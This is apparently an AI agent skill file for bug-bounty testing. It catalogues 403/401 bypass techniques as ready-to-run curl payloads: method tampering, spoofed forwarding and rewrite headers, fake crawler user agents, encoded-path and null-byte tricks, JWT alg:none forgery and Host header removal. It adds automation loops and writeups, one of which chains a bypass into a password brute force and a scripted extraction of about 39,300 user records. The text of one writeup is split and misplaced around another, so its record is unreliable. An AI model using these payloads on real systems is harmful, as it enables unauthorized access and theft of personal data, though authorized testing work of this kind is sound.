---
name: 403-bypass-testing
description: Bypassing a 403 Forbidden (or 401) response on a discovered-but-blocked endpoint/path — exploiting the gap between how a front-facing reverse proxy/WAF evaluates a request's path/method/headers and how the backend application actually interprets the same request. Covers HTTP method tampering, trusted-header spoofing (X-Original-URL, X-Rewrite-URL, X-Forwarded-For/Host, X-Client-IP), path encoding/case/obfuscation tricks, parameter tampering, JWT alg-none tampering, null byte injection, HTTP/1.0 downgrade, subdomain/port enumeration, Host header removal, and Wayback Machine recon for since-restricted endpoints — plus the automation tooling (ffuf, nmap http-methods, Burp 403 Bypasser extension, 4-ZERO-3) to sweep all of them at once. Use this during Phase 3 (Vulnerability Testing — Access control) of bughunting-workflow whenever directory/endpoint bruteforcing (dirsearch/ffuf) turns up a path returning 403/401 that looks interesting (`/admin`, `/internal`, `/api/private`, a path referenced in JS but not reachable directly). Also trigger on mentions of 403 bypass, 401 bypass, X-Original-URL, path-as-is, forbidden bypass, or access-control-filter bypass by path manipulation.
---

# 403/401 Forbidden Bypass Testing

Technique library for getting past a blocked response on an endpoint you already know exists (found via dir-bruteforce, JS analysis, or a linked-but-inaccessible reference). Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a *different* bypass primitive than what's already recorded.

## Core theory

A 403 on a discovered path almost never means "this is unreachable" — it means *the component that returned the 403 decided to block this specific request shape*. In any real deployment there are at least two components in the chain (reverse proxy/CDN/WAF in front, application server behind), and they routinely parse the same raw bytes differently: different case-sensitivity, different path-normalization rules for `..`/`;`/`%2e`/double-slashes, different sets of HTTP methods they even bother inspecting, different trust for `X-Forwarded-*`/`X-Original-URL` headers. The 403 comes from whichever component's rule matched first — every technique below is just "change the request just enough that the blocking component's rule no longer matches, while the request still means the same thing to the component you actually want to reach."

**Recon signal:** dir-bruteforce or JS-file analysis surfaces a path returning 403/401 instead of 404 — a 403 confirms the path *exists* and is specifically gated, which makes it a strictly higher-value target than a 404 would be.

**Systematic testing discipline:** send the blocked request to Burp Repeater and change **one variable per request** — one header, one encoding, one method — rather than guessing combinations blind. Track status code, response length, error-message wording, and any side effect across each attempt; a changed response (even a different error, not just 200/302/401-instead-of-403) is the signal to dig into that specific variable before moving to the next. This discipline pays off doubly once you reach the "Chaining techniques together" section below, since isolating which single variable moved the needle is what tells you which second variable to layer on top of it. (Source: [403 Isn't the End: Understanding Access Control Failures in Web Applications](https://freedium-mirror.cfd/https://medium.com/bug-bounty-hunting-a-comprehensive-guide-in/403-isnt-the-end-understanding-access-control-failures-in-web-applications-dab64f79bdcb))

**Severity framing — a bypass alone is usually low severity.** Reaching a 200 on a previously-403 endpoint is often just the first step; it only becomes a Critical/High finding once chained into a *second*, independent weakness behind it — IDOR (`advanced-access-control-testing`), privilege/role escalation, account takeover, feature abuse, or direct administrative-endpoint access. Always test and document what the newly-reachable endpoint actually *does* or *exposes*, not just that it returned 200 — see Recorded technique #4 for a worked example of this exact chain (case-variation bypass → unthrottled admin login → full takeover).

## Bypass technique categories

### 1. HTTP method tampering
Try every method beyond GET/POST — many access-control rules are written only against the methods the developer expected to see:
```bash
curl -X OPTIONS --path-as-is https://example.com/private/
curl -X PUT --path-as-is https://example.com/private/
curl -X PATCH --path-as-is https://example.com/private/
curl -X TRACE --path-as-is https://example.com/private/
# also try: DELETE, HEAD, CONNECT, PROPFIND, MKCOL, COPY, MOVE, LOCK, UNLOCK, SEARCH
```
`--path-as-is` is load-bearing here — curl normally normalizes/cleans up the path itself before sending, which silently undoes several of the path-obfuscation tricks below unless you disable it. Confirm which methods the server even distinguishes with:
```bash
nmap --script http-methods -p80,443 example.com
```

### 2. Trusted-header spoofing
```bash
curl -H "X-Original-URL: /admin" https://example.com/some-page
curl -H "X-Rewrite-URL: /admin" https://example.com/some-page
curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/private/
curl -H "X-Client-IP: 127.0.0.1" http://example.com/private/
curl -H "X-Custom-IP-Authorization: 127.0.0.1" http://example.com/private/
curl -H "X-Remote-IP: 127.0.0.1" http://example.com/private/
curl -H "X-Real-IP: 127.0.0.1" http://example.com/private/
curl -H "X-Host: localhost" https://example.com/private/
curl -H "X-Forwarded-Host: localhost" https://example.com/private/
curl -H "Referer: http://trustedsite.com/" https://example.com/private/
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://example.com/private/
curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://example.com/private/
curl -A "Amazon-Route53-Health-Check-Service" http://example.com/private/
curl -H "Forwarded: for=127.0.0.1" http://example.com/private/
```
`X-Original-URL`/`X-Rewrite-URL` target apps whose routing/authz decision is keyed off a header some upstream rewrite-proxy is expected to set, rather than the actual request path — send the *real* blocked path in the header while requesting an unrelated, unblocked path. `X-Forwarded-For`/`X-Client-IP`/`X-Real-IP: 127.0.0.1` target IP-allowlist checks (internal-only admin panels that trust "localhost" without verifying the request actually came from the loopback interface). The standard `Forwarded: for=127.0.0.1` syntax (RFC 7239) is worth trying alongside the `X-Forwarded-For` variant — some middleware only parses one of the two formats. (Source for `Forwarded:` and the Route53-health-check UA: [How Hackers Try to Bypass 403 Forbidden Pages (and Guarantee They Find Bugs)](https://freedium-mirror.cfd/https://infosecwriteups.com/how-hackers-try-to-bypass-403-forbidden-pages-and-guarantee-they-find-bugs-1119828a8c29).) The Googlebot/Route53-health-check User-Agent swaps target a different logic flaw than generic UA swapping: some apps explicitly carve out an allowlist exception for known crawler/monitoring UAs (to let pages get indexed, or to let uptime checks through without login walls), trusting the UA string alone with no reverse-DNS/IP-range verification that the request actually came from that infrastructure — any client can claim to be Googlebot or an AWS health checker for free. (Source for Googlebot UA: [Mastering 403 Bypass: Unlock Hidden Bounties Like a Pro](https://freedium-mirror.cfd/https://medium.com/the-first-digit/mastering-403-bypass-unlock-hidden-bounties-like-a-pro-bc8ee954c209) — reported $5,000 bounty for this exact bypass.)

### 3. Path encoding, case, and obfuscation tricks
```bash
# Case variation — some authz checks are case-sensitive, routing isn't (or vice versa)
/admin  /Admin  /ADMIN  /aDmiN

# Trailing/double slash, dot, semicolon path-parameter injection
/admin/   //admin//   /admin.   /..;/admin   /admin%2f

# Unicode/overlong slash encodings (some proxies decode these, some don't)
/admin%c0%af   /admin%ef%bc%8f

# Double encoding — only one of the two layers (proxy vs. backend) decodes twice; use sparingly, easy to trigger WAF alerting
/%252e/admin   /admin%252f

# Percent-encoded traversal
curl -g --path-as-is "https://example.com/%2e%2e/admin"
curl -g --path-as-is "https://example.com/%2e%2e%2fadmin"
curl -g --path-as-is "https://example.com/%20/admin"

# Suffix/extension appending — some rules only match the bare path
/admin.json  /admin.css  /admin.js  /admin.html  /admin.php
/admin.aspx  /admin.xml  /admin.txt  /admin.bak  /admin.old  /admin.zip  /admin.tar.gz

# Trailing query string/fragment noise
/admin?foo=bar#
```
The `-g` flag disables curl's own globbing so the raw encoded sequence reaches the wire unmodified — needed alongside `--path-as-is` for the percent-encoding variants to survive.

### 4. Parameter tampering
Append parameters that might satisfy a lazy path-only or param-presence check without any real validation behind it:
```bash
curl "https://example.com/admin?unused_param=1"
curl "https://example.com/admin?debug=true"
curl "https://example.com/admin?access=granted"
```

### 5. JWT `alg:none` / claim tampering
```
1. Decode the token at jwt.io (or `jwt_tool`)
2. Change "role": "user" → "role": "admin" in the payload
3. Set the header alg to "none" and strip the signature segment entirely
4. curl -H "Authorization: Bearer <MODIFIED_JWT>" https://example.com/adminarea
```
Only works against implementations that don't verify `alg` is on an expected allowlist server-side — a classic but still-common JWT library misconfiguration. Cross-reference `recon-scanning-toolkit`'s `jwt_tool` auth-bypass entry, and `jwt-attack-testing` for the full JWT attack surface beyond just this path-gating use case (algorithm confusion, `jwk`/`kid`/`jku`/`x5u` header injection, weak-secret brute-forcing).

### 6. Null byte injection
```bash
curl --path-as-is "https://example.com/admin.php%00.html"
curl --path-as-is "https://example.com/config.php%00.json"
curl --path-as-is "https://example.com/admin%00.php"
```
Legacy string-handling layers (older C-based extensions) truncate at `%00`, so an extension appended after it can pass a "must end in a safe extension" check while the server still executes/serves the pre-null-byte path.

### 7. HTTP/1.0 downgrade
```bash
curl --http1.0 https://example.com/admin
```
Some access-control middleware is only wired into the HTTP/1.1-specific request-handling path; a plain HTTP/1.0 request can route around it entirely if the server still accepts the older protocol.

### 8. IP spoofing via proxy chain
```bash
proxychains curl http://example.com/private/
```
Combine with header spoofing (#2) — some allowlists check the header, some check the actual source IP, some check both; a residential/rotating proxy plus the spoofed header covers both bases.

### 9. Protocol and entry-point switching
Test HTTP and HTTPS as fully separate cases (a rule written for one scheme sometimes isn't mirrored to the other), and enumerate alternate entry points that might front the same backend with weaker rules:
```
https://admin.example.com/admin
https://dev.example.com/admin
https://example.com:8080/admin
https://example.com:8443/admin
https://example.com:8000/admin
```

**Root-only blocking, subdirectories unprotected:** don't assume a 403 on a domain/path root means everything under it is equally gated — the block is sometimes written only against the exact root path, with every subdirectory left completely unenforced. Confirmed example: `legacypanel.redacted.com/` (root) returned 403, while directory-fuzzing with ffuf found `/dashboard` fully reachable underneath it with no bypass technique needed at all — just testing one level deeper. (Source: [Beyond the Wall: Bypassing OTP, WAF, and 403 for Exploiting a SQL Injection](https://freedium-mirror.cfd/https://medium.com/@remmy9/beyond-the-wall-bypassing-otp-waf-and-403-for-exploiting-a-sql-injection-97f06a3527c0)). Always run a full dir-bruteforce pass under a 403'd root before reaching for any active bypass technique — this costs nothing and sometimes the "bypass" turns out to be free.

### 10. Host header removal
Send the request with no `Host` header at all — some server configs fall back to a default/internal virtual host (e.g. `127.0.0.1`) when `Host` is absent, which can carry different (weaker) access rules than the named vhost. See also `host-header-injection-testing` for the broader Host-header-trust attack surface — this is the "missing" edge case of that same trust boundary rather than a spoofed-value case.

**Chain with category 7 (HTTP/1.0 downgrade):** HTTP/1.1 requires a `Host` header, but HTTP/1.0 doesn't — so downgrading to `--http1.0` is often the only way to actually get a Host-less request past curl/the client stack in the first place (confirmed against `lyncdiscover.microsoft.com`, source: [403 Bypass — lyncdiscover.microsoft.com](https://freedium-mirror.cfd/https://infosecwriteups.com/403-bypass-lyncdiscover-microsoft-com-db2778458c33)). A misconfigured server that falls back to treating a missing-Host request as local/trusted traffic can also leak the backend origin IP behind a CDN in the process — cross-reference `waf-origin-ip-discovery-testing`. Burp's **"Host Header Injection" extension** (by Gil Nothmann, BApp Store) automates sending Host-header variants including full omission, instead of hand-crafting raw requests outside curl.

### 11. Wayback Machine recon for since-restricted endpoints
```
https://web.archive.org/web/*/https://example.com/secret-file.txt
```
A path that's 403 today may have been public in the past — the archived snapshot can still contain the content even though the live path is now gated, with zero bypass technique needed at all.

### 12. IIS/ASP.NET-specific path-mangling bypasses
If the target fingerprints as IIS/ASP.NET (`Server: Microsoft-IIS/...`, `.aspx` paths), two additional stack-specific primitives exist beyond the generic list above: wrapping the path in a fake cookieless-session segment (`/(S(ABC123))/AdminPanel.aspx`), and appending a second, allowed page name as a trailing path segment after a blocked `.aspx` page (`/Admin/ManageUsers.aspx/Login.aspx`) to defeat naive `Request.Path`-string-comparison authz checks. See `iis-exploitation-testing` techniques #3 and #4 for full detail — both exploit the same "which component's interpretation of the path wins" pattern as the rest of this list, just via IIS-specific path-segment handling.

## Chaining techniques together

Don't stop at the first category that fails — the categories above aren't mutually exclusive, and a bypass that fails as a single technique often succeeds when two or three are stacked in the same request, because a 403 can be enforced by multiple independent checks (a WAF rule *and* an app-level authz check) that each need their own bypass simultaneously satisfied:
```bash
# Method tampering + trusted-header spoofing + path traversal encoding, all at once
curl -X PUT -H "X-Forwarded-For: 127.0.0.1" --path-as-is "https://example.com/%2e%2e/admin"

# Trusted-header spoofing + case variation
curl -H "X-Original-URL: /AdMiN" --path-as-is https://example.com/some-page

# IP spoof + UA spoof — covers both an IP-allowlist check and a separate UA-allowlist check on the same endpoint
curl -H "X-Forwarded-For: 127.0.0.1" -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" https://example.com/private/
```
**Practical chaining workflow:** test each category in isolation first (cheaper to interpret which one, if any, moved the needle) — method tampering and trusted-header spoofing first per the priority order in Recorded technique #1, then path encoding/case, then the rest. Once you find a category that changes the response *at all* (even a different error, not just a 200), start layering a second category on top of that same request rather than moving on — that's the signal you're dealing with a partial bypass against one of several stacked checks, and the remaining check(s) need their own technique added in the same request to fully clear it. The FFUF automation loop below can be adapted to iterate header payloads against path payloads for exactly this kind of two-axis sweep.

## Automation

```bash
# FFUF — sweep a header-payload list against a path-payload list in one loop
cat payloads/403_header_payloads.txt | while read header; do
  ffuf -w payloads/403_url_payloads.txt:PATH \
    -u https://example.com/PATH \
    -H "$header" -mc 200 -fs 0
done
```
(`403_header_payloads.txt` / `403_url_payloads.txt` — community wordlists pairing header names/values and path-obfuscation variants; search GitHub for current maintained versions.)

- **Burp Suite "403 Bypasser" extension** — automates the header/method/path permutations above against a target request from the BApp Store, with results in a dashboard instead of manual curl sweeps.
- **4-ZERO-3** (bash tool): `bash 403-bypass.sh -u https://target.com/secret --exploit` — runs the technique set as a single automated pass.
- **403Bypasser** (Go tool, github.com/alperenkesk/403Bypasser):
```bash
go install github.com/alperenkesk/403Bypasser@latest
export PATH=$PATH:$HOME/go/bin
403Bypasser -u https://target.com/admin
```
Pipe directly from a ffuf directory-bruteforce run to mass-retest every 403 it found in one pass:
```bash
grep "403" ffuf_results.txt | awk '{print $1}' > forbidden.txt
while read target; do
    403Bypasser -u "$target" >> bypass_results.txt
done < forbidden.txt
```
(Source: [Forbidden Doesn't Mean Impossible: Discovering Hidden Endpoints with 403Bypasser](https://freedium-mirror.cfd/https://medium.com/bug-bounty-hunting-a-comprehensive-guide-in/forbidden-doesnt-mean-impossible-%EF%B8%8F-discovering-hidden-endpoints-with-403bypasser-c65d7d5e6b9f))
- Other maintained automation scripts covering the same technique set: **byp4xx**, **bypass-403**, **forbiddenpass**, and a separate same-named **403bypasser** by yunemse48 (`./bypass-403.sh https://target.com secret` usage pattern) — interchangeable with 403Bypasser/4-ZERO-3, pick whichever is best-maintained at the time.

## Recorded techniques

### 1. Full 403/401 bypass technique catalog (baseline)
Source: [The Ultimate Guide to 403 Forbidden Bypass (2025 Edition)](https://infosecwriteups.com/the-ultimate-guide-to-403-forbidden-bypass-2025-edition-1b2e852e503e)

**Where:** any path discovered via dir-bruteforce/JS-analysis that returns 403/401 instead of 404 — the existence-confirming response makes it worth the extra effort versus a plain 404.

**Root cause:** disagreement between the component issuing the 403 (reverse proxy, CDN, WAF, or the app's own routing layer) and the component that would actually serve the content, over how to interpret the request's path encoding, HTTP method, or trusted headers.

**Exploit steps:** run the technique categories above roughly in this priority order — method tampering and trusted-header spoofing first (cheapest, highest historical hit-rate), then path encoding/case/obfuscation, then the rest — against every 403/401 path found; automate the sweep with the ffuf loop or Burp's 403 Bypasser once a promising category is identified, rather than testing every variant by hand.

**Impact framing for report:** severity is driven entirely by what the bypassed endpoint exposes/does, not by the bypass mechanism itself — a bypassed `/admin` reachable via `X-Original-URL` that then allows destructive actions is the same severity as if authz were missing outright; always demonstrate the *downstream* access gained (screenshot/data pulled from the now-reachable endpoint), not just "I got a 200 instead of 403."

**Generalize note:** this is a request-shape-parsing-disagreement bug class, structurally identical to the Host-header parsing-confusion variants in `host-header-injection-testing` and the duplicate-parameter layer-disagreement in `http-parameter-pollution-testing` — all three exploit "which component's interpretation of an ambiguous request wins." Try all three technique families against any access-control-gated endpoint, not just this skill's list in isolation.

### 2. Passive long-term monitoring — waiting out a 403 instead of bypassing it
Source: [From Recon to Critical Finding: An Unauthenticated Security Dashboard ($1,895 Bug Bounty)](https://freedium-mirror.cfd/https://codewithvamp.medium.com/from-recon-to-critical-finding-an-unauthenticated-security-dashboard-1895-bug-bounty-247cb07c5568)

**Where:** any 403/401 endpoint you've already confirmed exists (via dir-bruteforce, JS analysis, or a Shodan-discovered IP/service) but couldn't bypass with any active technique above.

**Root cause:** not a request-parsing disagreement this time — the endpoint's access control is *unstable over time*: config changes, a maintenance window, a redeploy, or a firewall-rule rotation can flip a genuinely-enforced 403 into a wide-open 200 with zero attacker action, because backend state drifts independently of anything the tester does. The article's finding was a **Prisma Defender dashboard** (cloud runtime-security/infrastructure-protection tool) that had been 403 for a long time and then, on a later revisit, was found fully unauthenticated.

**Exploit steps:**
1. Track discovered assets/IPs long-term rather than testing once and moving on — the article frames this explicitly as *"403s are often ignored — but they can be very valuable. They indicate the endpoint exists [and] something might be exposed behind it."*
2. Use Shodan to monitor previously-found IPs/services for behavioral or banner changes (cross-reference `recon-scanning-toolkit`'s `crtmon` standing-watch pattern — same idea of a continuous check instead of a one-shot snapshot, just applied to already-known hosts/ports rather than newly-issued certs).
3. Periodically revisit every recorded 403/401 path on those hosts (a simple scheduled `curl`/`httpx` re-check against your own running list of prior 403s is sufficient — no special tool required) instead of assuming a first-pass 403 is permanent.
4. When one flips to 200, confirm scope of exposure before escalating: here, the dashboard leaked workload/defender inventory counts, agent connect/disconnect status, cluster names/regions, cloud-account coverage, and **infrastructure IP addresses** — all without authentication.
5. Look for a bulk-export feature on the now-open panel — its presence upgrades the finding from "information disclosure" to "bulk data exfiltration risk," since an attacker doesn't need to scrape the UI screen-by-screen to weaponize it.

**Impact framing for report:** framed around downstream attacker capability, not just "unauthenticated dashboard": mapping the entire cloud environment, identifying unprotected/undefended workloads specifically, correlating exposed IPs to plan precision-targeted follow-on attacks, and one-click bulk exfiltration via the export button. Reported via HackerOne, acknowledged and fixed, **$1,895** bounty.

**Generalize note:** this is the patience-based counterpart to every active bypass technique above — keep a running list of every 403/401 you've hit on a target (not just the ones you managed to bypass) and re-check it on a cadence (weekly/monthly, or wire it into a scheduled Shodan/`httpx` re-scan) for the lifetime of your engagement with that program. Security-tooling dashboards specifically (Prisma, Datadog, Grafana, internal SIEM/EDR consoles) are high-value repeat targets for this pattern since they're deployed once and then rarely revisited by the target's own team for auth drift.

### 3. Forcing a rewrite-layer redirect to reach a 403-blocked login page (CVE-2023-5089, WordPress Defender Security plugin)
Source: [NASA: Hidden Login Page Bypass via auth_redirect (403 Bypass, CVE-2023-5089)](https://freedium-mirror.cfd/https://medium.com/bugbountywriteup/nasa-hidden-login-page-bypass-via-auth-redirect-403-bypass-cve-2023-5089-2999fa3ca4d4)

**Where:** WordPress sites running the Defender Security plugin (< 4.1.0) with its "Hide Login Page" feature enabled — the feature's entire purpose is to return a hard 403 on `/wp-login.php`/the renamed login slug for anyone not already authenticated, so this is a bypass of a security *feature* rather than of an infra/WAF layer.

**Root cause:** two separate app-logic gaps compound: (1) WordPress's own `auth_redirect()` function — meant to redirect an unauthenticated user who hits an auth-required page *back* to the login screen — can be triggered on an arbitrary unrelated endpoint via a crafted GET parameter (`?gf_page=<anything>`), and the plugin never accounted for `auth_redirect()` itself as a path that could reach the hidden login URL; (2) the redirect target it generates (`<hidden-login-slug>/?redirect_to=<url>&reauth=1`) is a URL *shape* the plugin's own 403 rule doesn't recognize as "the login page," so the request sails through where a direct hit on the same slug would have been blocked.

**Exploit steps:**
1. Identify the target is running Defender Security with Hide Login Page active (the normal login slug, typically `/wp-login.php` or whatever custom slug it's been changed to, 403s on direct access).
2. Request any page on the site with the crafted parameter appended: `https://target.com/some-page/?gf_page=randomstring` — this is enough to trigger `auth_redirect()` server-side, which issues a redirect toward the login flow even though the requested page itself had nothing to do with login.
3. Follow (or manually construct) the resulting redirect URL, shaped `https://target.com/<hidden-login-slug>/?redirect_to=<encoded_url>&reauth=1` — this exact query-string combination is what slips past the plugin's 403 rule and renders the fully functional login form.
4. The now-reachable login form accepts normal POST credential submissions with no further restriction, reopening it to brute force, credential stuffing, and username enumeration — the exact attack surface Hide Login Page exists to remove.

**Impact framing for report:** the vulnerability isn't "I can see a login form" — it's "an intentionally-deployed defense-in-depth control (obscuring the admin login endpoint, a common mitigation against mass WordPress credential-stuffing botnets) is fully defeated by a two-parameter URL trick," restoring the brute-force/enumeration/credential-stuffing attack surface the plugin was installed specifically to remove. CVE-2023-5089, CWE-284 (Improper Access Control).

**Generalize note:** this is a different bypass primitive from every entry above — not method/header/encoding tricks against a reverse-proxy/WAF layer, but abusing a *built-in CMS redirect function* as an unintended routing path that a plugin's own access-control rule failed to anticipate. Whenever a WordPress (or similarly plugin-architected CMS) feature advertises "hides/blocks an endpoint," test not just the endpoint directly but every built-in framework mechanism (redirect helpers, rewrite rules, `template_redirect` hooks, etc.) that could be coaxed into emitting a URL pointing back at it — the blocking plugin almost certainly only wrote its rule against the direct-access case.

### 4. Case-variation bypass chained into admin takeover + mass data exfiltration (external pentest)
Source: [Unusual 403 Bypass to a Full Website Takeover (External Pentest)](https://freedium-mirror.cfd/https://blog.viktormares.com/unusual-403-bypass-to-a-full-website-takeover-external-pentest-4970c788c6bf)

**Where:** a `gobuster`-discovered `/admin` path returning 403, on a target where method tampering, trusted-header spoofing, path-terminator tricks (`%00`/`//`/`;`/`?`), and protocol downgrade had all already been tried and failed — a real-world example of needing to work through the category list in `403-bypass-testing` before landing on the one that works, rather than any single technique being a silver bullet.

**Root cause:** the ACL in front of `/admin` did case-sensitive path matching with zero normalization, so `/Admin` or `/aDmin` (any single capitalized character, not necessarily full case reversal) never matched the blocking rule at all while still routing to the identical backend resource as the lowercase path.

**Exploit steps:**
1. Exhaust the cheaper/higher-hit-rate categories first (method tampering, header spoofing, path terminators, protocol downgrade) — all failed here, which is exactly when case variation (category 3's case-variation line) deserves a dedicated, systematic sweep rather than a couple of manual tries.
2. Confirm: `/admin` → 403, `/Admin` → 200, `/aDmin` → 200 — the login page renders fully once any letter is capitalized.
3. Don't stop at "I can see the login form" — check what's gating it further. Here: no username enumeration difference, **no rate limiting, no WAF blocking repeated attempts** (cross-reference `rate-limit-bypass-testing` and `session-auth-testing` entry #16 for the enumeration-diff/missing-lockout angle this chain leaned on).

### 5. `Content-Length: 0` header trick exposing a 403-blocked `.htaccess` (Hall of Fame)
Source: [403 Forbidden Bypass leads to Hall of Fame](https://freedium-mirror.cfd/https://infosecwriteups.com/403-forbidden-bypass-leads-to-hall-of-fame-ff61ccd0a71e)

**Where:** a `.htaccess` file on a subdomain (found among 400+ enumerated subdomains) returning 403 rather than 404, confirming it exists and is specifically gated.

**Root cause:** the server's access-control rule only validated requests shaped like a normal browser GET — adding an unexpected `Content-Length: 0` header to a POST, or swapping the method to TRACE, routed around the rule the same way method tampering in category 1 does, just with a header-presence quirk as the extra trigger.

**Exploit steps:**
1. Confirm the path is gated (403, not 404) before investing further effort.
2. Try the method-tampering sweep from category 1 first — here `GET → POST` alone failed, but `GET → TRACE` succeeded and returned 200, enabling direct download of the file content.
3. Separately, a POST with an explicit zero-length body header bypassed the restriction on its own:
```bash
curl -X POST -H "Content-Length:0" https://www.xyz.com
```
4. `X-Rewrite-URL` (already covered in category 2) was also effective against the same target:
```bash
curl -i -s -k -X $'GET' -H $'X-rewrite-url: .htaccess' https://sub.xyz.com/
```

**Impact framing for report:** exposure of a `.htaccess` file can leak server configuration, rewrite rules, and sometimes credentials/sensitive paths — reported to the program for **Hall of Fame recognition** (no monetary bounty).

**Generalize note:** reinforces that TRACE deserves a slot in every method-tampering sweep (category 1) even though it's rarely enabled on modern servers, and that `Content-Length: 0` is a cheap one-line addition worth trying on any POST-based bypass attempt before moving to heavier techniques.
4. With the bypass-reached login form unprotected by any throttling, run a straightforward `rockyou.txt` credential brute-force against it — valid admin credentials recovered after a few thousand attempts, no special technique needed beyond the missing rate limit itself.
5. Authenticate with the recovered admin credentials and confirm the resulting access level: full site configuration, user-database manipulation, page content control.
6. Script the actual data-exfiltration proof (Python, paginating through the admin's user-management view) rather than stopping at "I have admin access" — here it pulled ~39,300 full user records (name/email/phone/address), which is what turns "access control bypass" into a reportable mass-PII-breach-severity finding.

**Impact framing for report:** this is the chaining principle from this skill's own "Chaining techniques together" section demonstrated end-to-end across *multiple skills*, not just multiple bypass categories within this one — a 403 bypass (this skill) that reaches a login form with no rate limiting (`rate-limit-bypass-testing`) becomes full admin takeover and a 39,300-record PII breach once chained together. Report the full chain, not the bypass in isolation — the 403 bypass alone is Low/Medium severity; the completed chain is Critical. Both the case-sensitivity ACL gap and the missing rate-limit were patched by the client within 24 hours of the same-day report.

**Generalize note:** when every "standard" bypass category fails, don't give up on path-based bypasses — sweep every individual character position for case variation specifically (not just one or two manual attempts at `/Admin`/`/ADMIN`), since a single flipped character can be enough even when full-case-reversal isn't tried. And whenever a 403 bypass succeeds, the very next step is always to probe what's *behind* the now-reachable resource for a second, independent weakness (missing rate limit, default creds, IDOR) to chain into — treat the bypass as step one of an attack chain, not the finding itself.

<!-- Add new recorded techniques below this line as new 403/401-bypass writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
